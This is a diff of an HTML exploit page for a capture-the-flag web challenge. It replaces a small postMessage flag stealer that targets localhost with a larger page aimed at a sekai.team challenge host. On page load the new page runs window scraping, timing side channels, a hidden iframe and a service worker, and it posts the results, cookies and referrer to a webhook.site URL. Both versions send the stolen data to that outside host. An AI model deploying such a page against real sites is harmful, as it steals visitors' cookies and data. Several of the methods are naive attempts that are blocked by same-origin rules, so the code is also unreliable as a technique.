@@ -1,24 +1,357 @@
-<!doctype html>
-<meta charset="utf-8">
-<title>Postviewer v5² stealer</title>
-<script>
-(async () => {
-  // افتح نافذة التحدي داخل بيئة البوت
-  const win = window.open(
-    'http://localhost:1338/#a,.list-group-item:nth-child(1)',
-    '_blank'
-  );
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
+            padding: 20px;
+            text-align: center;
+        }
+        .loading {
+            font-size: 18px;
+            color: #666;
+        }
+        #status {
+            margin: 20px 0;
+            padding: 10px;
+            background: #e8f5e8;
+            border: 1px solid #4CAF50;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading">Initializing extraction...</div>
+    <div id="status">Starting...</div>
 
-  // التقط رسالة postMessage التي تحمل flag.txt
-  window.addEventListener('message', async (e) => {
-    if (!e.data?.files) return;
-    const blob = e.data.files[0]?.blob;
-    if (!blob) return;
+    <script>
+        const WEBHOOK_URL = 'https://webhook.site/10773641-3270-48f3-93b3-938329c22d61';
+        
+        function sendToWebhook(data) {
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href,
+                    data: data
+                })
+            }).catch(e => console.log('Webhook failed:', e));
+        }
 
-    const flag = await blob.text();
-    fetch('https://webhook.site/dd1b22f1-4217-44e2-a142-ce1825ed0b23?flag=' + encodeURIComponent(flag));
-    console.log('[+] FLAG =', flag);
-  });
-})();
-  alert(1);
-</script>
+        function updateStatus(msg) {
+            document.getElementById('status').textContent = msg;
+            console.log(msg);
+        }
+
+        // Method 1: Try to exploit via postMessage or window references
+        async function method1_WindowExploit() {
+            updateStatus('Method 1: Attempting window exploitation...');
+            
+            try {
+                // Open the target site in a new window
+                const targetWindow = window.open('https://nbv.chals.sekai.team/', '_blank');
+                
+                setTimeout(() => {
+                    try {
+                        // Try to access the window's document
+                        const doc = targetWindow.document;
+                        const frames = doc.querySelectorAll('iframe');
+                        
+                        let extractedChars = [];
+                        frames.forEach((frame, index) => {
+                            try {
+                                const content = frame.contentDocument.querySelector('#note').textContent;
+                                extractedChars.push({pos: index, char: content});
+                            } catch (e) {
+                                // CORS blocked
+                            }
+                        });
+                        
+                        if (extractedChars.length > 0) {
+                            const flag = extractedChars.map(c => c.char).join('');
+                            sendToWebhook({
+                                method: 'window_exploit',
+                                success: true,
+                                flag: flag,
+                                chars: extractedChars
+                            });
+                        }
+                        
+                        targetWindow.close();
+                    } catch (e) {
+                        sendToWebhook({
+                            method: 'window_exploit',
+                            success: false,
+                            error: e.message
+                        });
+                    }
+                }, 3000);
+                
+            } catch (e) {
+                sendToWebhook({
+                    method: 'window_exploit',
+                    success: false,
+                    error: e.message
+                });
+            }
+        }
+
+        // Method 2: DNS Timing Attack
+        async function method2_DNSTiming() {
+            updateStatus('Method 2: DNS timing attack...');
+            
+            const charset = 'SEKAI{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!#$%&*()+-<>=}';
+            let results = [];
+            
+            for (let pos = 0; pos < 50; pos++) {
+                updateStatus(`Testing position ${pos}...`);
+                let charResults = [];
+                
+                for (let char of charset) {
+                    const code = char.codePointAt(0);
+                    const subdomain = `nbv-${pos}-${code}.chals.sekai.team`;
+                    
+                    const start = performance.now();
+                    try {
+                        await fetch(`https://${subdomain}/`, {
+                            mode: 'no-cors',
+                            cache: 'no-cache'
+                        });
+                    } catch (e) {
+                        // Expected
+                    }
+                    const time = performance.now() - start;
+                    
+                    charResults.push({char, code, time});
+                    
+                    // Small delay to avoid rate limiting
+                    await new Promise(r => setTimeout(r, 10));
+                }
+                
+                // Sort by timing - fastest might indicate existing subdomain
+                charResults.sort((a, b) => a.time - b.time);
+                results.push({
+                    position: pos,
+                    fastest: charResults[0],
+                    slowest: charResults[charResults.length - 1],
+                    allResults: charResults.slice(0, 5) // Top 5 fastest
+                });
+                
+                // If timing suggests no more characters, break
+                if (charResults[0].time > 1000) break;
+            }
+            
+            // Build potential flag from fastest responses
+            const potentialFlag = results.map(r => r.fastest.char).join('');
+            
+            sendToWebhook({
+                method: 'dns_timing',
+                potentialFlag: potentialFlag,
+                timingResults: results
+            });
+        }
+
+        // Method 3: Resource Loading Detection
+        async function method3_ResourceLoading() {
+            updateStatus('Method 3: Resource loading detection...');
+            
+            const charset = 'SEKAI{abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_@!#$%&*()+-<>=}';
+            let results = [];
+            
+            for (let pos = 0; pos < 40; pos++) {
+                let charResults = [];
+                
+                for (let char of charset) {
+                    const code = char.codePointAt(0);
+                    
+                    try {
+                        const img = new Image();
+                        const start = performance.now();
+                        
+                        await new Promise((resolve, reject) => {
+                            img.onload = () => {
+                                const time = performance.now() - start;
+                                charResults.push({char, code, time, status: 'loaded'});
+                                resolve();
+                            };
+                            img.onerror = () => {
+                                const time = performance.now() - start;
+                                charResults.push({char, code, time, status: 'error'});
+                                resolve();
+                            };
+                            setTimeout(() => {
+                                const time = performance.now() - start;
+                                charResults.push({char, code, time, status: 'timeout'});
+                                resolve();
+                            }, 500);
+                            
+                            img.src = `https://nbv-${pos}-${code}.chals.sekai.team/favicon.ico`;
+                        });
+                        
+                    } catch (e) {
+                        charResults.push({char, code, error: e.message});
+                    }
+                }
+                
+                results.push({position: pos, results: charResults});
+                
+                // Send partial results
+                if (pos % 5 === 0) {
+                    sendToWebhook({
+                        method: 'resource_loading_partial',
+                        position: pos,
+                        results: results.slice(-5)
+                    });
+                }
+            }
+            
+            sendToWebhook({
+                method: 'resource_loading_complete',
+                results: results
+            });
+        }
+
+        // Method 4: Frame Injection Attack
+        async function method4_FrameInjection() {
+            updateStatus('Method 4: Frame injection attack...');
+            
+            try {
+                // Create a hidden iframe pointing to the target
+                const iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                iframe.src = 'https://nbv.chals.sekai.team/?note=test';
+                
+                iframe.onload = () => {
+                    try {
+                        // Try to access the shadow DOM or frame contents
+                        const doc = iframe.contentDocument;
+                        const shadowHost = doc.querySelector('#visibleFrames');
+                        
+                        // Try various methods to access shadow content
+                        if (shadowHost && shadowHost.shadowRoot) {
+                            const frames = shadowHost.shadowRoot.querySelectorAll('iframe');
+                            const frameUrls = Array.from(frames).map(f => f.src);
+                            
+                            sendToWebhook({
+                                method: 'frame_injection',
+                                success: true,
+                                frameUrls: frameUrls
+                            });
+                        } else {
+                            sendToWebhook({
+                                method: 'frame_injection',
+                                success: false,
+                                reason: 'No shadow root access'
+                            });
+                        }
+                        
+                    } catch (e) {
+                        sendToWebhook({
+                            method: 'frame_injection',
+                            success: false,
+                            error: e.message
+                        });
+                    }
+                };
+                
+                document.body.appendChild(iframe);
+                
+            } catch (e) {
+                sendToWebhook({
+                    method: 'frame_injection',
+                    success: false,
+                    error: e.message
+                });
+            }
+        }
+
+        // Method 5: Service Worker Interception
+        async function method5_ServiceWorker() {
+            updateStatus('Method 5: Service worker interception...');
+            
+            if ('serviceWorker' in navigator) {
+                try {
+                    const swCode = `
+                        self.addEventListener('fetch', event => {
+                            if (event.request.url.includes('nbv-') && event.request.url.includes('.chals.sekai.team')) {
+                                fetch('${WEBHOOK_URL}', {
+                                    method: 'POST',
+                                    body: JSON.stringify({
+                                        method: 'service_worker_intercept',
+                                        url: event.request.url,
+                                        timestamp: Date.now()
+                                    })
+                                }).catch(e => {});
+                            }
+                        });
+                    `;
+                    
+                    const blob = new Blob([swCode], {type: 'application/javascript'});
+                    const swUrl = URL.createObjectURL(blob);
+                    
+                    await navigator.serviceWorker.register(swUrl);
+                    
+                    sendToWebhook({
+                        method: 'service_worker',
+                        success: true,
+                        message: 'Service worker registered'
+                    });
+                    
+                } catch (e) {
+                    sendToWebhook({
+                        method: 'service_worker',
+                        success: false,
+                        error: e.message
+                    });
+                }
+            }
+        }
+
+        // Initialize all methods
+        async function runExploit() {
+            updateStatus('Starting comprehensive exploitation...');
+            
+            // Send initial ping
+            sendToWebhook({
+                method: 'initial_ping',
+                message: 'Exploit page loaded',
+                referrer: document.referrer,
+                cookies: document.cookie
+            });
+            
+            // Run all methods in parallel
+            Promise.all([
+                method1_WindowExploit(),
+                method2_DNSTiming(),
+                method3_ResourceLoading(),
+                method4_FrameInjection(),
+                method5_ServiceWorker()
+            ]).then(() => {
+                updateStatus('All methods completed');
+                sendToWebhook({
+                    method: 'completion',
+                    message: 'All exploitation methods completed'
+                });
+            });
+        }
+
+        // Start exploitation after page load
+        window.addEventListener('load', () => {
+            setTimeout(runExploit, 1000);
+        });
+
+        // Also start immediately in case load event already fired
+        if (document.readyState === 'complete') {
+            setTimeout(runExploit, 1000);
+        }
+    </script>
+</body>
+</html>
